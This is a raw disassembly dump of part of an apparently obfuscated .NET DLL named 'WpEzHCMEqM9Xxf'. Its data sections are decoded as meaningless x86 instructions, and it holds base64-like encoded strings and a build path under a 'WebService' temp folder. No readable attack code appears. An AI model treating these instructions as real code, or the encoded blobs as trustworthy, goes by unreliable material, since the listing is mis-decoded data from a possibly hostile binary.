10004c2b:	00 63 00             	add    %ah,0x0(%ebx)
10004c2e:	78 00                	js     0x10004c30
10004c30:	61                   	popa
10004c31:	00 48 00             	add    %cl,0x0(%eax)
10004c34:	4e                   	dec    %esi
10004c35:	00 33                	add    %dh,(%ebx)
10004c37:	00 52 00             	add    %dl,0x0(%edx)
10004c3a:	54                   	push   %esp
10004c3b:	00 46 00             	add    %al,0x0(%esi)
10004c3e:	50                   	push   %eax
10004c3f:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
10004c43:	00 56 00             	add    %dl,0x0(%esi)
10004c46:	46                   	inc    %esi
10004c47:	00 51 00             	add    %dl,0x0(%ecx)
10004c4a:	6d                   	insl   (%dx),%es:(%edi)
10004c4b:	00 68 00             	add    %ch,0x0(%eax)
10004c4e:	7a 00                	jp     0x10004c50
10004c50:	64 00 30             	add    %dh,%fs:(%eax)
10004c53:	00 55 00             	add    %dl,0x0(%ebp)
10004c56:	78 00                	js     0x10004c58
10004c58:	54                   	push   %esp
10004c59:	00 30                	add    %dh,(%eax)
10004c5b:	00 39                	add    %bh,(%ecx)
10004c5d:	00 31                	add    %dh,(%ecx)
10004c5f:	00 52 00             	add    %dl,0x0(%edx)
10004c62:	55                   	push   %ebp
10004c63:	00 4a 00             	add    %cl,0x0(%edx)
10004c66:	46                   	inc    %esi
10004c67:	00 57 00             	add    %dl,0x0(%edi)
10004c6a:	56                   	push   %esi
10004c6b:	00 68 00             	add    %ch,0x0(%eax)
10004c6e:	6f                   	outsl  %ds:(%esi),(%dx)
10004c6f:	00 63 00             	add    %ah,0x0(%ebx)
10004c72:	33 00                	xor    (%eax),%eax
10004c74:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004c78:	4d                   	dec    %ebp
10004c79:	00 55 00             	add    %dl,0x0(%ebp)
10004c7c:	39 00                	cmp    %eax,(%eax)
10004c7e:	50                   	push   %eax
10004c7f:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004c83:	00 56 00             	add    %dl,0x0(%esi)
10004c86:	43                   	inc    %ebx
10004c87:	00 61 00             	add    %ah,0x0(%ecx)
10004c8a:	48                   	dec    %eax
10004c8b:	00 4e 00             	add    %cl,0x0(%esi)
10004c8e:	33 00                	xor    (%eax),%eax
10004c90:	52                   	push   %edx
10004c91:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004c95:	00 50 00             	add    %dl,0x0(%eax)
10004c98:	54                   	push   %esp
10004c99:	00 33                	add    %dh,(%ebx)
10004c9b:	00 56 00             	add    %dl,0x0(%esi)
10004c9e:	46                   	inc    %esi
10004c9f:	00 51 00             	add    %dl,0x0(%ecx)
10004ca2:	6c                   	insb   (%dx),%es:(%edi)
10004ca3:	00 4a 00             	add    %cl,0x0(%edx)
10004ca6:	6f                   	outsl  %ds:(%esi),(%dx)
10004ca7:	00 57 00             	add    %dl,0x0(%edi)
10004caa:	47                   	inc    %edi
10004cab:	00 68 00             	add    %ch,0x0(%eax)
10004cae:	7a 00                	jp     0x10004cb0
10004cb0:	64 00 30             	add    %dh,%fs:(%eax)
10004cb3:	00 55 00             	add    %dl,0x0(%ebp)
10004cb6:	78 00                	js     0x10004cb8
10004cb8:	54                   	push   %esp
10004cb9:	00 30                	add    %dh,(%eax)
10004cbb:	00 39                	add    %bh,(%ecx)
10004cbd:	00 31                	add    %dh,(%ecx)
10004cbf:	00 52 00             	add    %dl,0x0(%edx)
10004cc2:	55                   	push   %ebp
10004cc3:	00 4a 00             	add    %cl,0x0(%edx)
10004cc6:	6f                   	outsl  %ds:(%esi),(%dx)
10004cc7:	00 63 00             	add    %ah,0x0(%ebx)
10004cca:	33 00                	xor    (%eax),%eax
10004ccc:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004cd0:	4d                   	dec    %ebp
10004cd1:	00 55 00             	add    %dl,0x0(%ebp)
10004cd4:	39 00                	cmp    %eax,(%eax)
10004cd6:	50                   	push   %eax
10004cd7:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004cdb:	00 56 00             	add    %dl,0x0(%esi)
10004cde:	43                   	inc    %ebx
10004cdf:	00 52 00             	add    %dl,0x0(%edx)
10004ce2:	6e                   	outsb  %ds:(%esi),(%dx)
10004ce3:	00 63 00             	add    %ah,0x0(%ebx)
10004ce6:	39 00                	cmp    %eax,(%eax)
10004ce8:	61                   	popa
10004ce9:	00 48 00             	add    %cl,0x0(%eax)
10004cec:	4e                   	dec    %esi
10004ced:	00 33                	add    %dh,(%ebx)
10004cef:	00 52 00             	add    %dl,0x0(%edx)
10004cf2:	54                   	push   %esp
10004cf3:	00 46 00             	add    %al,0x0(%esi)
10004cf6:	50                   	push   %eax
10004cf7:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
10004cfb:	00 56 00             	add    %dl,0x0(%esi)
10004cfe:	46                   	inc    %esi
10004cff:	00 51 00             	add    %dl,0x0(%ecx)
10004d02:	67 00 3d             	add    %bh,(%di)
10004d05:	00 3d 00 00 15 68    	add    %bh,0x68150000
10004d0b:	00 73 00             	add    %dh,0x0(%ebx)
10004d0e:	77 00                	ja     0x10004d10
10004d10:	45                   	inc    %ebp
10004d11:	00 31                	add    %dh,(%ecx)
10004d13:	00 4f 00             	add    %cl,0x0(%edi)
10004d16:	4f                   	dec    %edi
10004d17:	00 75 00             	add    %dh,0x0(%ebp)
10004d1a:	45                   	inc    %ebp
10004d1b:	00 42 00             	add    %al,0x0(%edx)
10004d1e:	00 03                	add    %al,(%ebx)
10004d20:	ba 00 01 80 b9       	mov    $0xb9800100,%edx
10004d25:	51                   	push   %ecx
10004d26:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10004d2a:	00 47 00             	add    %al,0x0(%edi)
10004d2d:	5a                   	pop    %edx
10004d2e:	00 47 00             	add    %al,0x0(%edi)
10004d31:	34 00                	xor    $0x0,%al
10004d33:	34 00                	xor    $0x0,%al
10004d35:	4d                   	dec    %ebp
10004d36:	00 6d 00             	add    %ch,0x0(%ebp)
10004d39:	4a                   	dec    %edx
10004d3a:	00 75 00             	add    %dh,0x0(%ebp)
10004d3d:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10004d41:	78 00                	js     0x10004d43
10004d43:	74 00                	je     0x10004d45
10004d45:	56                   	push   %esi
10004d46:	00 6b 00             	add    %ch,0x0(%ebx)
10004d49:	45                   	inc    %ebp
10004d4a:	00 35 00 52 00 6d    	add    %dh,0x6d005200
10004d50:	00 52 00             	add    %dl,0x0(%edx)
10004d53:	75 00                	jne    0x10004d55
10004d55:	4f                   	dec    %edi
10004d56:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004d5a:	00 69 00             	add    %ch,0x0(%ecx)
10004d5d:	62 00                	bound  %eax,(%eax)
10004d5f:	6e                   	outsb  %ds:(%esi),(%dx)
10004d60:	00 5a 00             	add    %bl,0x0(%edx)
10004d63:	42                   	inc    %edx
10004d64:	00 4f 00             	add    %cl,0x0(%edi)
10004d67:	55                   	push   %ebp
10004d68:	00 5a 00             	add    %bl,0x0(%edx)
10004d6b:	6b 00 62             	imul   $0x62,(%eax),%eax
10004d6e:	00 6a 00             	add    %ch,0x0(%edx)
10004d71:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004d75:	59                   	pop    %ecx
10004d76:	00 6d 00             	add    %ch,0x0(%ebp)
10004d79:	35 00 32 00 4e       	xor    $0x4e003200,%eax
10004d7e:	00 46 00             	add    %al,0x0(%esi)
10004d81:	70 00                	jo     0x10004d83
10004d83:	52                   	push   %edx
10004d84:	00 51 00             	add    %dl,0x0(%ecx)
10004d87:	54                   	push   %esp
10004d88:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10004d8c:	00 5a 00             	add    %bl,0x0(%edx)
10004d8f:	47                   	inc    %edi
10004d90:	00 34 00             	add    %dh,(%eax,%eax,1)
10004d93:	34 00                	xor    $0x0,%al
10004d95:	4d                   	dec    %ebp
10004d96:	00 6d 00             	add    %ch,0x0(%ebp)
10004d99:	4a                   	dec    %edx
10004d9a:	00 75 00             	add    %dh,0x0(%ebp)
10004d9d:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10004da1:	45                   	inc    %ebp
10004da2:	00 35 00 52 00 6d    	add    %dh,0x6d005200
10004da8:	00 52 00             	add    %dl,0x0(%edx)
10004dab:	75 00                	jne    0x10004dad
10004dad:	4f                   	dec    %edi
10004dae:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004db2:	00 69 00             	add    %ch,0x0(%ecx)
10004db5:	62 00                	bound  %eax,(%eax)
10004db7:	6e                   	outsb  %ds:(%esi),(%dx)
10004db8:	00 59 00             	add    %bl,0x0(%ecx)
10004dbb:	39 00                	cmp    %eax,(%eax)
10004dbd:	50                   	push   %eax
10004dbe:	00 55 00             	add    %dl,0x0(%ebp)
10004dc1:	45                   	inc    %ebp
10004dc2:	00 35 00 52 00 6d    	add    %dh,0x6d005200
10004dc8:	00 52 00             	add    %dl,0x0(%edx)
10004dcb:	75 00                	jne    0x10004dcd
10004dcd:	4f                   	dec    %edi
10004dce:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004dd2:	00 69 00             	add    %ch,0x0(%ecx)
10004dd5:	62 00                	bound  %eax,(%eax)
10004dd7:	6e                   	outsb  %ds:(%esi),(%dx)
10004dd8:	00 59 00             	add    %bl,0x0(%ecx)
10004ddb:	3d 00 00 15 41       	cmp    $0x41150000,%eax
10004de0:	00 39                	add    %bh,(%ecx)
10004de2:	00 46 00             	add    %al,0x0(%esi)
10004de5:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004de9:	38 00                	cmp    %al,(%eax)
10004deb:	32 00                	xor    (%eax),%al
10004ded:	62 00                	bound  %eax,(%eax)
10004def:	6e                   	outsb  %ds:(%esi),(%dx)
10004df0:	00 76 00             	add    %dh,0x0(%esi)
10004df3:	00 0a                	add    %cl,(%edx)
10004df5:	88 92 9c ff bb 72    	mov    %dl,0x72bbff9c(%edx)
10004dfb:	43                   	inc    %ebx
10004dfc:	a0 5e 7d e4 97       	mov    0x97e47d5e,%al
10004e01:	6d                   	insl   (%dx),%es:(%edi)
10004e02:	ce                   	into
10004e03:	bd 00 04 20 01       	mov    $0x1200400,%ebp
10004e08:	01 08                	add    %ecx,(%eax)
10004e0a:	03 20                	add    (%eax),%esp
10004e0c:	00 01                	add    %al,(%ecx)
10004e0e:	05 20 01 01 11       	add    $0x11010120,%eax
10004e13:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004e16:	01 01                	add    %eax,(%ecx)
10004e18:	0e                   	push   %cs
10004e19:	04 20                	add    $0x20,%al
10004e1b:	01 01                	add    %eax,(%ecx)
10004e1d:	02 04 00             	add    (%eax,%eax,1),%al
10004e20:	00 12                	add    %dl,(%edx)
10004e22:	61                   	popa
10004e23:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e28:	0e                   	push   %cs
10004e29:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e2e:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e33:	0e                   	push   %cs
10004e34:	0e                   	push   %cs
10004e35:	0c 10                	or     $0x10,%al
10004e37:	01 02                	add    %eax,(%edx)
10004e39:	15 12 71 01 1e       	adc    $0x1e017112,%eax
10004e3e:	00 1e                	add    %bl,(%esi)
10004e40:	00 08                	add    %cl,(%eax)
10004e42:	03 0a                	add    (%edx),%ecx
10004e44:	01 0e                	add    %ecx,(%esi)
10004e46:	06                   	push   %es
10004e47:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004e4c:	03 05 20 02 01 1c    	add    0x1c010220,%eax
10004e52:	18 17                	sbb    %dl,(%edi)
10004e54:	10 02                	adc    %al,(%edx)
10004e56:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004e5c:	01 15 12 71 01 1e    	add    %edx,0x1e017112
10004e62:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004e68:	00 1e                	add    %bl,(%esi)
10004e6a:	01 04 0a             	add    %eax,(%edx,%ecx,1)
10004e6d:	02 0e                	add    (%esi),%cl
10004e6f:	03 0c 10             	add    (%eax,%edx,1),%ecx
10004e72:	01 01                	add    %eax,(%ecx)
10004e74:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
10004e79:	71 01                	jno    0x10004e7c
10004e7b:	1e                   	push   %ds
10004e7c:	00 03                	add    %al,(%ebx)
10004e7e:	0a 01                	or     (%ecx),%al
10004e80:	03 05 20 01 01 1d    	add    0x1d010120,%eax
10004e86:	03 0c 07             	add    (%edi,%eax,1),%ecx
10004e89:	07                   	pop    %es
10004e8a:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
10004e8d:	10 18                	adc    %bl,(%eax)
10004e8f:	18 18                	sbb    %bl,(%eax)
10004e91:	12 49 09             	adc    0x9(%ecx),%cl
10004e94:	06                   	push   %es
10004e95:	10 01                	adc    %al,(%ecx)
10004e97:	01 08                	add    %ecx,(%eax)
10004e99:	1e                   	push   %ds
10004e9a:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004e9d:	01 11                	add    %edx,(%ecx)
10004e9f:	0c 02                	or     $0x2,%al
10004ea1:	06                   	push   %es
10004ea2:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004ea8:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004eab:	01 01                	add    %eax,(%ecx)
10004ead:	08 05 00 01 12 49    	or     %al,0x49120100
10004eb3:	08 03                	or     %al,(%ebx)
10004eb5:	20 00                	and    %al,(%eax)
10004eb7:	02 06                	add    (%esi),%al
10004eb9:	07                   	pop    %es
10004eba:	02 12                	add    (%edx),%dl
10004ebc:	18 1d 0e 05 15 12    	sbb    %bl,0x1215050e
10004ec2:	5d                   	pop    %ebp
10004ec3:	01 0e                	add    %ecx,(%esi)
10004ec5:	05 20 01 01 13       	add    $0x13010120,%eax
10004eca:	00 09                	add    %cl,(%ecx)
10004ecc:	00 03                	add    %al,(%ebx)
10004ece:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004ed3:	80 85 06 15 12 59 02 	addb   $0x2,0x59121506(%ebp)
10004eda:	0e                   	push   %cs
10004edb:	02 16                	add    (%esi),%dl
10004edd:	10 01                	adc    %al,(%ecx)
10004edf:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004ee5:	00 15 12 71 01 1e    	add    %dl,0x1e017112
10004eeb:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004ef1:	00 02                	add    %al,(%edx)
10004ef3:	04 20                	add    $0x20,%al
10004ef5:	01 08                	add    %ecx,(%eax)
10004ef7:	08 04 07             	or     %al,(%edi,%eax,1)
10004efa:	02 0e                	add    (%esi),%cl
10004efc:	0e                   	push   %cs
10004efd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
10004f02:	0e                   	push   %cs
10004f03:	06                   	push   %es
10004f04:	00 01                	add    %al,(%ecx)
10004f06:	12 80 8d 0e 06 00    	adc    0x60e8d(%eax),%al
10004f0c:	03 0e                	add    (%esi),%ecx
10004f0e:	0e                   	push   %cs
10004f0f:	0e                   	push   %cs
10004f10:	0e                   	push   %cs
10004f11:	06                   	push   %es
10004f12:	00 03                	add    %al,(%ebx)
10004f14:	01 0e                	add    %ecx,(%esi)
10004f16:	0e                   	push   %cs
10004f17:	02 03                	add    (%ebx),%al
10004f19:	20 00                	and    %al,(%eax)
10004f1b:	08 04 20             	or     %al,(%eax,%eiz,1)
10004f1e:	01 03                	add    %eax,(%ebx)
10004f20:	08 04 00             	or     %al,(%eax,%eax,1)
10004f23:	01 0e                	add    %ecx,(%esi)
10004f25:	0e                   	push   %cs
10004f26:	05 20 01 02 13       	add    $0x13020120,%eax
10004f2b:	00 08                	add    %cl,(%eax)
10004f2d:	b7 7a                	mov    $0x7a,%bh
10004f2f:	5c                   	pop    %esp
10004f30:	56                   	push   %esi
10004f31:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004f34:	89 03                	mov    %eax,(%ebx)
10004f36:	06                   	push   %es
10004f37:	12 45 02             	adc    0x2(%ebp),%al
10004f3a:	06                   	push   %es
10004f3b:	09 02                	or     %eax,(%edx)
10004f3d:	06                   	push   %es
10004f3e:	0e                   	push   %cs
10004f3f:	02 06                	add    (%esi),%al
10004f41:	08 02                	or     %al,(%edx)
10004f43:	06                   	push   %es
10004f44:	06                   	push   %es
10004f45:	03 06                	add    (%esi),%eax
10004f47:	12 14 07             	adc    (%edi,%eax,1),%dl
10004f4a:	06                   	push   %es
10004f4b:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004f50:	03 06                	add    (%esi),%eax
10004f52:	06                   	push   %es
10004f53:	15 12 5d 01 0e       	adc    $0xe015d12,%eax
10004f58:	11 00                	adc    %eax,(%eax)
10004f5a:	0a 02                	or     (%edx),%al
10004f5c:	0e                   	push   %cs
10004f5d:	0e                   	push   %cs
10004f5e:	18 18                	sbb    %bl,(%eax)
10004f60:	02 09                	add    (%ecx),%cl
10004f62:	18 0e                	sbb    %cl,(%esi)
10004f64:	10 11                	adc    %dl,(%ecx)
10004f66:	0c 10                	or     $0x10,%al
10004f68:	11 10                	adc    %edx,(%eax)
10004f6a:	0a 00                	or     (%eax),%al
10004f6c:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004f71:	05 09 10 18 04       	add    $0x4181009,%eax
10004f76:	00 01                	add    %al,(%ecx)
10004f78:	0e                   	push   %cs
10004f79:	08 06                	or     %al,(%esi)
10004f7b:	00 02                	add    %al,(%edx)
10004f7d:	02 18                	add    (%eax),%bl
10004f7f:	10 09                	adc    %cl,(%ecx)
10004f81:	06                   	push   %es
10004f82:	00 02                	add    %al,(%edx)
10004f84:	01 0e                	add    %ecx,(%esi)
10004f86:	1d 05 04 00 01       	sbb    $0x1000405,%eax
10004f8b:	02 18                	add    (%eax),%bl
10004f8d:	08 00                	or     %al,(%eax)
10004f8f:	05 18 18 18 09       	add    $0x9181818,%eax
10004f94:	09 09                	or     %ecx,(%ecx)
10004f96:	0b 00                	or     (%eax),%eax
10004f98:	07                   	pop    %es
10004f99:	18 18                	sbb    %bl,(%eax)
10004f9b:	18 09                	sbb    %cl,(%ecx)
10004f9d:	18 18                	sbb    %bl,(%eax)
10004f9f:	09 10                	or     %edx,(%eax)
10004fa1:	18 03                	sbb    %al,(%ebx)
10004fa3:	00 00                	add    %al,(%eax)
10004fa5:	01 03                	add    %eax,(%ebx)
10004fa7:	00 00                	add    %al,(%eax)
10004fa9:	0e                   	push   %cs
10004faa:	04 20                	add    $0x20,%al
10004fac:	01 03                	add    %eax,(%ebx)
10004fae:	0e                   	push   %cs
10004faf:	04 20                	add    $0x20,%al
10004fb1:	01 02                	add    %eax,(%edx)
10004fb3:	0e                   	push   %cs
10004fb4:	08 01                	or     %al,(%ecx)
10004fb6:	00 08                	add    %cl,(%eax)
10004fb8:	00 00                	add    %al,(%eax)
10004fba:	00 00                	add    %al,(%eax)
10004fbc:	00 1e                	add    %bl,(%esi)
10004fbe:	01 00                	add    %eax,(%eax)
10004fc0:	01 00                	add    %eax,(%eax)
10004fc2:	54                   	push   %esp
10004fc3:	02 16                	add    (%esi),%dl
10004fc5:	57                   	push   %edi
10004fc6:	72 61                	jb     0x10005029
10004fc8:	70 4e                	jo     0x10005018
10004fca:	6f                   	outsl  %ds:(%esi),(%dx)
10004fcb:	6e                   	outsb  %ds:(%esi),(%dx)
10004fcc:	45                   	inc    %ebp
10004fcd:	78 63                	js     0x10005032
10004fcf:	65 70 74             	gs jo  0x10005046
10004fd2:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004fd9:	77 73                	ja     0x1000504e
10004fdb:	01 08                	add    %ecx,(%eax)
10004fdd:	01 00                	add    %eax,(%eax)
10004fdf:	02 00                	add    (%eax),%al
10004fe1:	00 00                	add    %al,(%eax)
10004fe3:	00 00                	add    %al,(%eax)
10004fe5:	13 01                	adc    (%ecx),%eax
10004fe7:	00 0e                	add    %cl,(%esi)
10004fe9:	57                   	push   %edi
10004fea:	70 45                	jo     0x10005031
10004fec:	7a 48                	jp     0x10005036
10004fee:	43                   	inc    %ebx
10004fef:	4d                   	dec    %ebp
10004ff0:	45                   	inc    %ebp
10004ff1:	71 4d                	jno    0x10005040
10004ff3:	39 58 78             	cmp    %ebx,0x78(%eax)
10004ff6:	66 00 00             	data16 add %al,(%eax)
10004ff9:	05 01 00 00 00       	add    $0x1,%eax
10004ffe:	00 17                	add    %dl,(%edi)
10005000:	01 00                	add    %eax,(%eax)
10005002:	12 43 6f             	adc    0x6f(%ebx),%al
10005005:	70 79                	jo     0x10005080
10005007:	72 69                	jb     0x10005072
10005009:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
1000500f:	20 20                	and    %ah,(%eax)
10005011:	32 30                	xor    (%eax),%dh
10005013:	32 34 00             	xor    (%eax,%eax,1),%dh
10005016:	00 29                	add    %ch,(%ecx)
10005018:	01 00                	add    %eax,(%eax)
1000501a:	24 36                	and    $0x36,%al
1000501c:	38 45 36             	cmp    %al,0x36(%ebp)
1000501f:	37                   	aaa
10005020:	43                   	inc    %ebx
10005021:	41                   	inc    %ecx
10005022:	34 2d                	xor    $0x2d,%al
10005024:	33 43 34             	xor    0x34(%ebx),%eax
10005027:	39 2d 34 32 39 41    	cmp    %ebp,0x41393234
1000502d:	2d 41 43 33 45       	sub    $0x45334341,%eax
10005032:	2d 38 44 46 38       	sub    $0x38464438,%eax
10005037:	43                   	inc    %ebx
10005038:	30 35 45 35 46 39    	xor    %dh,0x39463545
1000503e:	36 00 00             	add    %al,%ss:(%eax)
10005041:	0c 01                	or     $0x1,%al
10005043:	00 07                	add    %al,(%edi)
10005045:	31 2e                	xor    %ebp,(%esi)
10005047:	30 2e                	xor    %ch,(%esi)
10005049:	30 2e                	xor    %ch,(%esi)
1000504b:	30 00                	xor    %al,(%eax)
1000504d:	00 49 01             	add    %cl,0x1(%ecx)
10005050:	00 1a                	add    %bl,(%edx)
10005052:	2e 4e                	cs dec %esi
10005054:	45                   	inc    %ebp
10005055:	54                   	push   %esp
10005056:	46                   	inc    %esi
10005057:	72 61                	jb     0x100050ba
10005059:	6d                   	insl   (%dx),%es:(%edi)
1000505a:	65 77 6f             	gs ja  0x100050cc
1000505d:	72 6b                	jb     0x100050ca
1000505f:	2c 56                	sub    $0x56,%al
10005061:	65 72 73             	gs jb  0x100050d7
10005064:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
1000506b:	38 01                	cmp    %al,(%ecx)
1000506d:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10005071:	46                   	inc    %esi
10005072:	72 61                	jb     0x100050d5
10005074:	6d                   	insl   (%dx),%es:(%edi)
10005075:	65 77 6f             	gs ja  0x100050e7
10005078:	72 6b                	jb     0x100050e5
1000507a:	44                   	inc    %esp
1000507b:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10005082:	61                   	popa
10005083:	6d                   	insl   (%dx),%es:(%edi)
10005084:	65 12 2e             	adc    %gs:(%esi),%ch
10005087:	4e                   	dec    %esi
10005088:	45                   	inc    %ebp
10005089:	54                   	push   %esp
1000508a:	20 46 72             	and    %al,0x72(%esi)
1000508d:	61                   	popa
1000508e:	6d                   	insl   (%dx),%es:(%edi)
1000508f:	65 77 6f             	gs ja  0x10005101
10005092:	72 6b                	jb     0x100050ff
10005094:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10005097:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
100050a2:	00 00                	add    %al,(%eax)
100050a4:	53                   	push   %ebx
100050a5:	8a ad cf 00 00 00    	mov    0xcf(%ebp),%ch
100050ab:	00 02                	add    %al,(%edx)
100050ad:	00 00                	add    %al,(%eax)
100050af:	00 79 00             	add    %bh,0x0(%ecx)
100050b2:	00 00                	add    %al,(%eax)
100050b4:	d8 50 00             	fcoms  0x0(%eax)
100050b7:	00 d8                	add    %bl,%al
100050b9:	32 00                	xor    (%eax),%al
	...
100050c7:	00 10                	add    %dl,(%eax)
	...
100050d5:	00 00                	add    %al,(%eax)
100050d7:	00 52 53             	add    %dl,0x53(%edx)
100050da:	44                   	inc    %esp
100050db:	53                   	push   %ebx
100050dc:	1b ce                	sbb    %esi,%ecx
100050de:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
100050e0:	fc                   	cld
100050e1:	bb d2 49 a0 fa       	mov    $0xfaa049d2,%ebx
100050e6:	3c b1                	cmp    $0xb1,%al
100050e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
100050e9:	69 16 5f 01 00 00    	imul   $0x15f,(%esi),%edx
100050ef:	00 43 3a             	add    %al,0x3a(%ebx)
100050f2:	5c                   	pop    %esp
100050f3:	55                   	push   %ebp
100050f4:	73 65                	jae    0x1000515b
100050f6:	72 73                	jb     0x1000516b
100050f8:	5c                   	pop    %esp
100050f9:	77 6f                	ja     0x1000516a
100050fb:	72 6b                	jb     0x10005168
100050fd:	74 65                	je     0x10005164
100050ff:	61                   	popa
10005100:	6d                   	insl   (%dx),%es:(%edi)
10005101:	5c                   	pop    %esp
10005102:	44                   	inc    %esp
10005103:	65 73 6b             	gs jae 0x10005171
10005106:	74 6f                	je     0x10005177
10005108:	70 5c                	jo     0x10005166
1000510a:	57                   	push   %edi
1000510b:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
1000510f:	72 76                	jb     0x10005187
10005111:	69 63 65 5c 61 73 73 	imul   $0x7373615c,0x65(%ebx),%esp
10005118:	65 74 73             	gs je  0x1000518e
1000511b:	5c                   	pop    %esp
1000511c:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000511f:	5c                   	pop    %esp
10005120:	74 65                	je     0x10005187
10005122:	6d                   	insl   (%dx),%es:(%edi)
10005123:	70 2d                	jo     0x10005152
10005125:	65 31 64 33 61       	xor    %esp,%gs:0x61(%ebx,%esi,1)
1000512a:	36 35 39 63 37 39    	ss xor $0x39376339,%eax
10005130:	65 5c                	gs pop %esp
10005132:	6f                   	outsl  %ds:(%esi),(%dx)
10005133:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10005136:	52                   	push   %edx
10005137:	65 6c                	gs insb (%dx),%es:(%edi)
10005139:	65 61                	gs popa
1000513b:	73 65                	jae    0x100051a2
1000513d:	5c                   	pop    %esp
1000513e:	57                   	push   %edi
1000513f:	70 45                	jo     0x10005186
10005141:	7a 48                	jp     0x1000518b
10005143:	43                   	inc    %ebx
10005144:	4d                   	dec    %ebp
10005145:	45                   	inc    %ebp
10005146:	71 4d                	jno    0x10005195
10005148:	39 58 78             	cmp    %ebx,0x78(%eax)
1000514b:	66 2e 70 64          	data16 jo,pn 0x100051b3
1000514f:	62 00                	bound  %eax,(%eax)
10005151:	79 51                	jns    0x100051a4
	...
1000515b:	00 00                	add    %al,(%eax)
1000515d:	93                   	xchg   %eax,%ebx
1000515e:	51                   	push   %ecx
1000515f:	00 00                	add    %al,(%eax)
10005161:	00 20                	add    %ah,(%eax)
	...
10005177:	00 00                	add    %al,(%eax)
10005179:	85 51 00             	test   %edx,0x0(%ecx)
	...
10005184:	00 00                	add    %al,(%eax)
10005186:	00 5f 43             	add    %bl,0x43(%edi)
10005189:	6f                   	outsl  %ds:(%esi),(%dx)
1000518a:	72 44                	jb     0x100051d0
1000518c:	6c                   	insb   (%dx),%es:(%edi)
1000518d:	6c                   	insb   (%dx),%es:(%edi)
1000518e:	4d                   	dec    %ebp
1000518f:	61                   	popa
10005190:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10005197:	72 65                	jb     0x100051fe
10005199:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
1000519d:	6c                   	insb   (%dx),%es:(%edi)
	...
100051a6:	ff 25 00 20 00 10    	jmp    *0x10002000
